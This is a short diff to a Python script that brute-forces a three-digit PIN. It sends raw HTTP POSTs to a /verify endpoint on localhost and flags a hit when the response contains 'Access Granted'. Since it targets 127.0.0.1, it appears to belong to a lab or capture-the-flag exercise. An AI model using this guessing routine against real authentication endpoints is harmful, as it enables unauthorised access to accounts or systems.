@@ -4,7 +4,9 @@ HOST = '127.0.0.1'
 PORT = 8888
 
 def try_pin(pin):
-    data = f"magicNumber={pin}"
+    pin_str = f"{pin:03d}"  
+    data = f"magicNumber={pin_str}"
+    
     request = (
         "POST /verify HTTP/1.1\r\n"
         f"Host: {HOST}\r\n"
@@ -28,6 +30,15 @@ def try_pin(pin):
 
     sock.close()
     
-    return response.decode()
+    decoded = response.decode(errors="ignore")
+    
+    if "Access Granted" in decoded:
+        print(f"SUCCESS! PIN: {pin_str}")
+        return True
+    else:
+        print(f"Trying PIN {pin_str}")
+        return False
 
-print(try_pin(123))
+
+
+
